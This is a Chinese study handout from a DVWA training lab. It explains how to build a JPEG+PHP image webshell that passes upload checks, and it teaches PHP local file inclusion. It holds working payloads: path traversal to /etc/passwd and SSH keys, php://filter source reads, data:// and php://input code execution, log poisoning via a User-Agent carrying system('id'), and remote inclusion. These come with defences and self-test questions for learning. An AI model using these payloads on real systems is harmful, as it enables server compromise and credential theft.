# 11/22 资料：完整图片马 + PHP 执行原理 + 文件包含

> 第一部分是今天的成果复盘（源码级）
> 第二部分是全新内容：文件包含（LFI）
> 陌生字符都会解释

---

# 第一部分：今天那个能过 High 的图片马

## 1.1 生成它的三条命令

```bash
# 第一步：让容器里的 GD 库生成一张真的 20x20 JPEG
docker exec dvwa-dvwa-1 php -r '$i=imagecreatetruecolor(20,20); imagejpeg($i,"/tmp/real.jpg");'

# 第二步：把真图片拷到 Kali
docker cp dvwa-dvwa-1:/tmp/real.jpg /tmp/real.jpg

# 第三步：真图片 + php 代码 拼接
printf '<?php echo "PWNED:" . $_GET["c"]; ?>' > /tmp/shell.php
cat /tmp/real.jpg /tmp/shell.php > ~/shell.jpg
```

**第三条命令里 `cat` 的逻辑：** 把两个文件的内容按顺序接到一起，输出到 `shell.jpg`。

```
结果 = [real.jpg 的全部字节][shell.php 的全部字节]
```

一个字节都不改，纯拼接。

## 1.2 它的完整字节结构

```
[FF D8 FF E0 00 10 4A 46 49 46 ...]   ← real.jpg 的全部内容（约 2.5KB）
                                    ↓
[3C 3F 70 68 70 20 65 63 68 6F ...]  ← shell.php 的 36 个字节
```

拆开看：

**前面那一大坨是真 JPEG。** 它有完整的：

SOI 段（`FF D8`，文件开始）

APP0 段（`FF E0`，存 "JFIF" 标识）

DQT 段（`FF DB`，量化表）

SOF0 段（`FF C0`，存宽度 20、高度 20）

SOS 段（`FF DA`，图像数据开始）

压缩后的像素数据

EOI 段（`FF D9`，文件结束）

**这些都是真数据，`getimagesize` 能完整解析。**

**后面那 36 个字节是 php 代码**，附加在 EOI 之后。

## 1.3 为什么它能过 High

High 的三道检查：

```php
// 第一道：后缀白名单
if (!($ext == "jpg" || $ext == "jpeg" || $ext == "png")) { 拒绝; }

// 第二道：文件大小
if ($size > 100000) { 拒绝; }

// 第三道：能不能解析成图片
if (getimagesize($tmp) === false) { 拒绝; }
```

**三道全过：**

后缀是 `.jpg` → 第一道过

2.5KB → 第二道过

`getimagesize` 读到真的 SOI/APP0/SOF0，解析出 20×20 → 第三道过

**关键在第三道。**

`getimagesize` 不是"看开头几个字节"，它会**顺着 JPEG 的段结构一路解析下去**：

读 `FF D8` → 确认是 JPEG

读 `FF E0` + 长度 + "JFIF" → 跳过 APP0 段

读 `FF DB` + 长度 → 跳过量化表

读 `FF C0` + 长度 + 精度 + **高度 2 字节 + 宽度 2 字节** → 拿到尺寸了

**它读到 `FF C0` 拿到尺寸就返回，不会读到文件末尾。**

**所以尾部那 36 个字节的 php，它压根没看见。**

## 1.4 为什么之前那个"假 JPEG"过不了

对比一下你昨晚失败的那个：

```
FF D8 FF E0  3C 3F 70 68 70 ...
              ↑↑
        这里是 APP0 段的"长度"字段
```

JPEG 的段结构是：

```
[FF E0][长度: 2 字节][段数据: 长度-2 字节]
```

你的长度字节是 `3C 3F`，转成数字 = **16188**。

`getimagesize` 读到"这一段有 16188 字节"，往后一数，文件总共才 38 字节。

**数据不够 → 解析失败 → 返回 false。**

**这就是"假图头"和"真图片"的区别：**

假图头只能骗过"只看开头"的检查（比如 `file` 命令）

真图片能骗过"顺着结构解析"的检查（比如 `getimagesize`）

## 1.5 PHP 执行这个文件时，到底发生了什么（核心）

这是你最想搞清楚的部分。分七步走。

### 第 1 步：Apache 决定交给 PHP

请求 `/hackable/uploads/shell.jpg`。

`FilesMatch \.(phtml|php|gif|jpg)$` 匹配上了 → `SetHandler application/x-httpd-php`

**所以这个文件被交给 PHP 处理器，而不是当静态文件发出去。**

### 第 2 步：PHP 打开文件，按字节读

PHP 拿到的是一串字节流：

```
FF D8 FF E0 00 10 4A 46 49 46 00 01 ...
（中间 2.5KB 的图片数据）
...
FF D9 3C 3F 70 68 70 20 65 63 68 6F ...
```

**注意：PHP 不知道也不关心这是不是图片。** 对它来说就是一串字节。

### 第 3 步：进入"文本模式"

**这是理解一切的关键。**

PHP 解析文件时，有两种模式：

| 模式 | 触发 | 行为 |
|---|---|---|
| **文本模式**（HTML 模式） | 文件开头默认是它 | 所有字节**原样输出**到响应 |
| **代码模式**（PHP 模式） | 遇到 `<?php` | 解析成代码，编译执行 |
| 回到文本模式 | 遇到 `?>` | 继续原样输出 |

**你的文件从头开始：**

```
FF D8 FF E0 ...（2.5KB 图片数据）... FF D9
```

**这一整段全在文本模式里，PHP 会把它全部输出到响应体。**

### 第 4 步：遇到 `<?php` 切换模式

读到 `3C 3F` 这两个字节（`<?`），PHP 认出这是 PHP 开标签。

**从这一刻起，进入代码模式。**

接下来的 `echo "PWNED:" . $_GET["c"];` 被当作代码处理。

### 第 5 步：代码被编译执行

PHP 内部四个动作：

**① 词法分析（lexer）** —— 把字符切成 token

```
T_ECHO                      echo
T_CONSTANT_ENCAPSED_STRING  "PWNED:"
T_CONCAT                    .
T_VARIABLE                  $_GET
...
```

**② 语法分析（parser）** —— 把 token 组织成抽象语法树（AST）

```
ECHO 节点
 └── 拼接表达式
      ├── 字符串 "PWNED:"
      └── 数组访问 $_GET["c"]
```

**③ 编译** —— 把 AST 变成 Zend 虚拟机的指令（opcode）

```
FETCH_DIM_R   $_GET, "c"     ; 取出 $_GET["c"] 的值
CONCAT        "PWNED:", 上一步的结果
ECHO          上一步的结果
```

**④ 执行** —— Zend VM 逐条跑这些 opcode

`$_GET["c"]` 的值是 `hello`
拼接成 `PWNED:hello`
写进输出缓冲区

### 第 6 步：遇到 `?>` 回到文本模式

代码模式结束，后面的字节重新按文本模式处理。

你这个文件 `?>` 后面没有了，所以直接结束。

### 第 7 步：输出缓冲区刷出去

PHP 把输出缓冲区的内容（那 2.5KB 图片数据 + `PWNED:hello`）交给 Apache。

Apache 加上响应头（`Content-Type: text/html`、`Content-Length` 等）发回浏览器。

## 1.6 所以你看到的是什么

`curl` 打出来的响应是这样：

```
（2.5KB 的二进制乱码）
PWNED:hello
```

**那 2.5KB 乱码不是错误，是你那张 JPEG 的原始数据。**

因为它在 `<?php` 前面，处于文本模式，PHP 原样输出了。

**浏览器里看到的可能是：**

一片乱码 + 最后 `PWNED:hello`

或者浏览器试图把整段当图片渲染，失败，显示破图

**两种都正常。**

## 1.7 一句话总结

**PHP 文件不是"纯代码"，是"文本和代码交替"的文件。**

```
[文本]<?php [代码] ?>[文本]<?php [代码] ?>
```

**任何在 `<?php ... ?>` 之外的内容，都会被原样输出。**

**这就是图片马的原理：**

图片数据放在 `<?php` 之前 → 被当文本输出（不影响文件是合法图片）

代码放在 `<?php` 之后 → 被执行

**两个解析器，各取所需。**

---

# 第二部分：新内容——文件包含（LFI）

## 2.1 为什么现在讲这个

**你昨天的图片马上传成功了，但访问时不一定执行。**

因为 `FilesMatch` 里有没有 `jpg` 是你自己改的配置。真实目标不会给你配。

**真实世界里让图片马执行的办法，是文件包含。**

流程变成：

```
第一步：传 shell.jpg（图片马）
        → 绕过所有上传检查，文件落到服务器上
        
第二步：找一个有文件包含漏洞的页面
        → index.php?page=../../uploads/shell.jpg
        
第三步：include 读它、执行它
        → 你的 php 代码跑起来了
```

**上传漏洞负责"能不能放进去"，包含漏洞负责"能不能跑起来"。**

## 2.2 include 到底做了什么

PHP 里四个类似的语句：

| 语句 | 找不到文件时 | 适用 |
|---|---|---|
| `include` | 警告，继续执行 | 常用 |
| `include_once` | 同上，但只包含一次 | 防重复 |
| `require` | **致命错误，停止** | 必须存在的文件 |
| `require_once` | 同上，只一次 | 常用 |

**它们做的事完全一样：**

**读取指定路径的文件内容 → 当成 PHP 代码解析执行。**

**注意两个关键点：**

**第一，它不看扩展名。**

`include("shell.jpg")` 会读 `shell.jpg`，只要有 `<?php` 标签就执行。

**第二，它不检查路径。**

`include($_GET['page'])` 直接把用户输入当路径。

## 2.3 为什么会写成 `include($_GET['page'])`

**因为正常需求就长这样。**

一个网站有十几种语言的版本：

```php
<?php
$lang = $_GET['lang'];
include("lang/" . $lang . ".php");
?>
```

访问 `?lang=en` → 包含 `lang/en.php`
访问 `?lang=zh` → 包含 `lang/zh.php`

**这是最自然的写法。** 开发者想的是"用户只会传 en 或 zh"，而不是 `../../../etc/passwd`。

**这就是漏洞的起源：把用户输入当路径用。**

## 2.4 本地文件包含（LFI）能读出什么

### 一、系统文件

```
?page=../../../../etc/passwd
```

`../` 是"上一级目录"。四个 `../` 能跳出好几层，到根目录。

`/etc/passwd` 是 Linux 的用户列表文件，一定存在，一定可读。

**预期输出：** 一堆 `root:x:0:0:root:/root:/bin/bash` 这样的行。

**这个文件本身不敏感**（密码在 `/etc/shadow`，普通用户读不了），但**能读出来就证明漏洞存在**。

### 二、其他敏感文件

| 文件 | 内容 |
|---|---|
| `/etc/shadow` | 密码哈希（需要 root 权限） |
| `/etc/hosts` | 主机映射 |
| `/proc/self/environ` | 当前进程的环境变量（可能有密钥） |
| `/root/.ssh/id_rsa` | SSH 私钥 |
| `/var/www/html/config.php` | 数据库账号密码 |

### 三、但有个大问题：PHP 文件会被执行

如果你包含一个 `.php` 文件，它会被**执行**，你只能看到执行后的 HTML 输出，看不到源码。

**比如 `include("config.php")`：**

`config.php` 里是：

```php
<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "s3cr3t";
?>
```

**你包含它，PHP 执行它（赋值给变量），然后什么都不输出。**

**你看不到 `s3cr3t`。**

### 四、解决办法：php://filter

这就是下面要讲的。

## 2.5 php://filter —— 让源码不执行，只输出

### 语法

```
php://filter/<过滤器>/resource=<目标文件>
```

例：

```
?page=php://filter/convert.base64-encode/resource=config.php
```

### 逐步拆解

**`php://`** —— 这是一个"流包装器"（stream wrapper）前缀，告诉 PHP "别当普通文件路径，用我的内置协议"。

**`filter`** —— 具体是 filter 这个包装器，作用是在读写时做数据变换。

**`convert.base64-encode`** —— 过滤器名字。把流经的数据转成 Base64。

**`resource=config.php`** —— 真正要读的文件。

### 执行顺序

```
1. PHP 收到 php://filter/...
2. 不走"当代码执行"这条路，而是走"读取文件内容"这条
3. 读出 config.php 的原始字节
4. 用 base64 编码成字符串
5. 把编码结果交给 include
6. include 看到的是纯 base64 字符（A-Z a-z 0-9 + / =）
7. 字符里没有 <?php 标签
8. 所以 include 不执行任何代码，直接输出这段字符串
```

**你拿到一串 base64，解开就是源码。**

### 为什么必须用 base64

**因为如果直接 `include("config.php")`，里面的代码会执行，输出可能是空的。**

用 base64 编码之后：

**代码变成了"数据"。** `<?php` 这三个字变成了 `PD9waHA` 这样的字符，不再是标签。

**读取操作变成了"读文件"而不是"执行文件"。**

**这就是"绕过"的本质：改变数据的形态，让它无法被当成代码解释。**

### 更多过滤器

| 过滤器 | 作用 |
|---|---|
| `convert.base64-encode` | 转 Base64 |
| `convert.base64-decode` | 从 Base64 解 |
| `string.rot13` | 字符位移 13 位 |
| `string.toupper` | 转大写 |
| `zlib.deflate` | 压缩 |

**可以串联：**

```
php://filter/convert.base64-encode|convert.base64-decode/resource=file
```

（用 `|` 连接多个过滤器，和管道一个意思）

## 2.6 伪协议全家桶

`php://` 只是一类。PHP 支持很多"协议前缀"：

| 协议 | 作用 | 需要什么条件 |
|---|---|---|
| `php://filter` | 读写时过滤 | 无 |
| `php://input` | 读请求体（POST 原始数据） | 无（但 `allow_url_include` 影响能否包含） |
| `data://` | 内联数据 | `allow_url_include=On` |
| `file://` | 读本地文件 | 无 |
| `phar://` | 读 phar 归档（可能触发反序列化） | 文件要存在 |
| `zip://` | 读 zip 里的文件 | zip 扩展 |
| `expect://` | 执行命令 | 装了 expect 扩展 |

### `data://` 的用法

```
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

`PD9waHAgcGhwaW5mbygpOz8+` 解出来是 `<?php phpinfo();?>`。

**不需要上传任何文件，直接内联代码。**

**但需要 `allow_url_include=On`**，默认是关的。

### `php://input` 的用法

```
POST ?page=php://input
Body: <?php system('id'); ?>
```

**把 POST 的请求体当文件内容包含。**

**同样需要 `allow_url_include=On`。**

### `phar://` —— 最隐蔽的一个

```
?page=phar://uploads/shell.jpg/x
```

**照片的 phar 格式可以伪装成图片。** phar 文件的结构（序列化数据）能嵌在 JPEG 里。

**这条路的杀伤力在于：读取 phar 时会触发 PHP 反序列化，可能直接 RCE。**

**暂时不用深究，知道有这么个东西就行。**

## 2.7 日志包含 —— 不用上传文件

**思路：** 如果你能读服务器日志，就往日志里写字，再包含日志。

**第一步，把 php 代码写进日志。**

```bash
curl -A "<?php system('id'); ?>" http://127.0.0.1:4280/
```

`-A` 是设置 User-Agent（浏览器标识）。

Apache 会把每次请求记进日志，包括 User-Agent。

**所以你的 php 代码就写进 `/var/log/apache2/access.log` 了。**

**第二步，包含那个日志。**

```
?page=../../../../var/log/apache2/access.log
```

**第三步，代码执行。**

**这条路的价值：不需要上传权限，只要能触发一个访问 + 一次包含。**

**缺点：** 日志文件可能很大，要找自己那条；有的配置把 User-Agent 做了转义。

## 2.8 远程文件包含（RFI）

```
?page=http://攻击者的服务器/shell.txt
```

**直接包含远程文件。**

**条件：** `allow_url_include=On`（默认 Off）。

**这条路一旦通，几乎等于直接 Getshell。**

**不开的原因是：太危险了，PHP 官方默认关闭。**

## 2.9 防御怎么做

| 层次 | 做法 |
|---|---|
| 最根本 | **不要用用户输入当路径** |
| 白名单 | `$allowed = ['en','zh','jp']; if (!in_array($lang, $allowed)) die();` |
| 路径检查 | `realpath()` 解出真实路径，检查是否在允许目录内 |
| 关闭危险配置 | `allow_url_include = Off`、`allow_url_fopen = Off` |
| 权限 | web 进程不要有读 `/etc/shadow` 的权限 |

**白名单是最好的防御，因为路径是"可以枚举完的"。**

---

# 第三部分：把两部分串起来

## 完整攻击链

```
① 发现上传点
   ↓
② 传图片马（shell.jpg：真 JPEG + 尾部 php）
   → 过大小、后缀、MIME、getimagesize 四道检查
   ↓
③ 文件落在 /uploads/shell.jpg
   ↓
④ 发现文件包含点（index.php?page=）
   ↓
⑤ 包含它：?page=../../uploads/shell.jpg
   → include 读到文件，文本模式输出 JPEG 数据，代码模式执行 php
   ↓
⑥ 拿到 webshell
```

**你昨天只走完了 ②③，剩下的 ④⑤ 是明天要学的。**

## 一句话

**上传漏洞解决"文件能不能进去"，包含漏洞解决"文件能不能跑起来"。**

**两个都占，才是 Getshell。只占一个，通常只能算信息泄露。**

---

# 第四部分：抄写安排（按 5 小时）

| 时段 | 内容 | 时长 |
|---|---|---|
| 上午 | 第一部分 1.1-1.4（图片马与 High） | 60 分钟 |
| 上午 | 1.5（PHP 七个步骤，重点） | 60 分钟 |
| 午饭 | 1.6-1.7（你看到的是什么） | 30 分钟 |
| 下午 | 2.1-2.3（include 机制） | 50 分钟 |
| 下午 | 2.4-2.5（LFI 与 php://filter） | 60 分钟 |
| 下班前 | 2.6-2.9（伪协议、日志、防御） | 50 分钟 |

**最忙也至少抄：1.5 那七个步骤 + 2.5 的 php://filter。**

这两块是明天的核心。

---

# 第五部分：自测

1. 真图片马和假图头的区别是什么？为什么前者能过 `getimagesize`？
2. `getimagesize` 解析 JPEG 时读到哪一段就停了？为什么不会读到尾部？
3. PHP 的"文本模式"和"代码模式"分别什么时候切换？
4. 为什么图片数据放在 `<?php` 前面不会破坏语法？
5. 文件包含时，为什么 `include("config.php")` 看不到源码？
6. `php://filter/convert.base64-encode` 为什么能让源码不执行？
7. `../` 是什么？为什么能跳出当前目录？
8. `allow_url_include` 控制什么？默认是开还是关？
9. 日志包含为什么不需要上传文件？
10. 用 `realpath()` 做防御，防的是什么攻击？

---

# 一句总结

**上传是"把东西放进去"，包含是"把东西拿出来读"。**

**PHP 的 include 天生就信任你给的路径——这是设计，不是 bug。**

**所有文件包含漏洞，本质都是"把不该给用户控制的路径交给了用户"。**
